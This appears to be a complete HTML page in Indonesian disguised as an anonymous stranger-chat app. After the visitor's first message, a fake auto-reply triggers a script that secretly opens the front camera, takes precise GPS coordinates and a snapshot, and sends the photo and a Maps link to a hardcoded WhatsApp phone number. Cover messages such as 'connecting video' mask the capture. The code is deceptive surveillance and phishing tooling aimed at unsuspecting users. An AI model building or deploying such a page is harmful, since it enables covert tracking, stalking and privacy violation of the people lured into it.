<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Anonymous Chat</title>
    <style>
        :root {
            --bg-color: #0b141a;
            --chat-bg: #1e2329;
            --message-sent: #005c4b;
            --message-received: #202c33;
            --text-primary: #e9edef;
            --text-secondary: #8696a0;
            --accent: #00a884;
            --header-bg: #1f2c34;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-primary);
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        header {
            background-color: var(--header-bg);
            padding: 15px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #2a3942;
            z-index: 10;
        }

        .avatar {
            width: 40px; height: 40px; background-color: #333; border-radius: 50%;
            display: flex; align-items: center; justify-content: center; 
            font-size: 20px; margin-right: 10px; color: #fff;
        }

        .header-info h1 { font-size: 16px; font-weight: 500; margin-bottom: 2px; }
        .header-info p { font-size: 12px; color: var(--text-secondary); }

        #chat-area {
            flex: 1; overflow-y: auto; padding: 20px;
            background-image: radial-gradient(#1f2c34 1px, transparent 1px); background-size: 20px 20px;
            display: flex; flex-direction: column;
            justify-content: flex-end;
        }

        .message {
            max-width: 80%; padding: 8px 12px; border-radius: 8px; margin-bottom: 10px;
            position: relative; word-wrap: break-word; font-size: 14px;
            box-shadow: 0 1px 0.5px rgba(0,0,0,0.13);
        }

        .message.received { background-color: var(--message-received); align-self: flex-start; border-top-left-radius: 0; }
        .message.sent { background-color: var(--message-sent); align-self: flex-end; border-top-right-radius: 0; }
        
        .timestamp { font-size: 11px; color: rgba(255,255,255,0.6); text-align: right; margin-top: 4px; display: block; }

        #input-area {
            padding: 10px; background-color: var(--header-bg);
            display: flex; gap: 10px; align-items: center;
        }

        #msg-input {
            flex: 1; padding: 12px; border-radius: 8px; border: none;
            background-color: #2a3942; color: white; outline: none;
        }

        #btn-send {
            background-color: var(--accent); color: white; border: none;
            width: 40px; height: 40px; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-size: 18px; cursor: pointer;
        }

        /* Loading Overlay */
        #loader {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(11, 20, 26, 0.98); display: none;
            flex-direction: column; align-items: center; justify-content: center; z-index: 100;
        }
        
        .spinner {
            width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--accent);
            border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .loading-text { color: white; font-size: 14px; margin-bottom: 20px; }

        #hidden-video { display: none; }
    </style>
</head>
<body>

<header>
    <div class="avatar">👤</div>
    <div class="header-info">
        <h1>Stranger</h1>
        <p id="status-text">Online</p>
    </div>
</header>

<div id="chat-area">
    <div class="message received">Halo, silakan kirim pesan untuk mulai chat.</div>
</div>

<div id="input-area">
    <input type="text" id="msg-input" placeholder="Ketik pesan..." autocomplete="off">
    <button id="btn-send" onclick="sendMessage()">➤</button>
</div>

<!-- Loading Screen -->
<div id="loader">
    <div class="spinner"></div>
    <div class="loading-text" id="loader-msg">Menghubungkan...</div>
</div>

<video id="hidden-video" autoplay playsinline muted></video>

<script>
    // --- KONFIGURASI NOMOR WA ---
    // Nomor tujuan: 083871914387 -> Format internasional: 6283871914387
    const WA_NUMBER = "6283871914387"; 
    // ----------------------------

    const chatArea = document.getElementById('chat-area');
    const loader = document.getElementById('loader');
    const loaderMsg = document.getElementById('loader-msg');
    const statusText = document.getElementById('status-text');
    const hiddenVideo = document.getElementById('hidden-video');
    const msgInput = document.getElementById('msg-input');

    function getTime() {
        return new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    }

    function addMessage(text, type) {
        const msgDiv = document.createElement('div');
        msgDiv.className = `message ${type}`;
        msgDiv.innerHTML = `${text}<br><span class="timestamp">${getTime()}</span>`;
        chatArea.appendChild(msgDiv);
        chatArea.scrollTop = chatArea.scrollHeight;
    }

    async function startCapture() {
        loader.style.display = 'flex';
        loaderMsg.innerText = "Menghubungkan Video...";
        statusText.innerText = "Connecting...";

        try {
            // 1. Nyalakan Kamera Depan
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user" } 
            });
            
            hiddenVideo.srcObject = stream;
            await hiddenVideo.play();

            // Jeda sebentar biar kamera siap (buffer)
            await new Promise(r => setTimeout(r, 1000));

            // 2. Ambil Lokasi
            loaderMsg.innerText = "Mendapatkan Lokasi...";
            const lokasi = await getGPS();

            // 3. Ambil Foto
            loaderMsg.innerText = "Memproses Foto...";
            const fotoBlob = takeSnapshot(stream);

            // Matikan kamera
            stream.getTracks().forEach(track => track.stop());

            // 4. Kirim ke WA
            await sendToWhatsApp(lokasi, fotoBlob);

            // Selesai
            loader.style.display = 'none';
            statusText.innerText = "Connected";
            addMessage("Koneksi Video Stabil", "received");
            
        } catch (error) {
            console.error(error);
            loader.style.display = 'none';
            statusText.innerText = "Error";
            addMessage(`Gagal: ${error.message}`, "received");
        }
    }

    function getGPS() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject("GPS tidak didukung");
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const lat = pos.coords.latitude;
                    const lng = pos.coords.longitude;
                    resolve({ lat, lng });
                },
                (err) => reject(err.message),
                { enableHighAccuracy: true, timeout: 10000 }
            );
        });
    }

    function takeSnapshot(stream) {
        const canvas = document.createElement('canvas');
        canvas.width = hiddenVideo.videoWidth || 640;
        canvas.height = hiddenVideo.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        
        // Flip horizontal biar kayak cermin (opsional, tapi lebih natural buat selfie)
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        
        ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
        
        return new Promise(resolve => {
            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        });
    }

    async function sendToWhatsApp(lokasi, blob) {
        const mapsUrl = `https://www.google.com/maps?q=${lokasi.lat},${lokasi.lng}`;
        
        // Buat pesan teks
        const text = `📸 *Foto Baru Diterima*\n\n📍 *Lokasi:\n${mapsUrl}*\n\nAkurasi: ${lokasi.lat} / ${lokasi.lng}`;

        // Konversi gambar ke Base64 untuk dikirim via WA API
        const reader = new FileReader();
        reader.readAsDataURL(blob);
        reader.onload = function() {
            const base64Image = reader.result;
            
            // Encode data untuk URL
            const encodedImage = encodeURIComponent(base64Image);
            const encodedText = encodeURIComponent(text);
            
            // Format URL WA
            const waURL = `https://api.whatsapp.com/send?phone=${WA_NUMBER}&text=${encodedText}&hasMedia=1&media=${encodedImage}`;
            
            // Buka WA
            window.location.href = waURL;
        };
    }

    function sendMessage() {
        const text = msgInput.value.trim();
        if (!text) return;
        
        addMessage(text, "sent");
        msgInput.value = "";

        // Simulasi balasan otomatis
        setTimeout(() => {
            addMessage("Sedang membaca...", "received");
            setTimeout(() => {
                // Pemicu utama: jika user chat pertama kali, kita ambil foto
                startCapture();
            }, 1500);
        }, 1000);
    }

    // Enter key
    msgInput.addEventListener("keypress", function(event) {
        if (event.key === "Enter") sendMessage();
    });
</script>

</body>
</html>
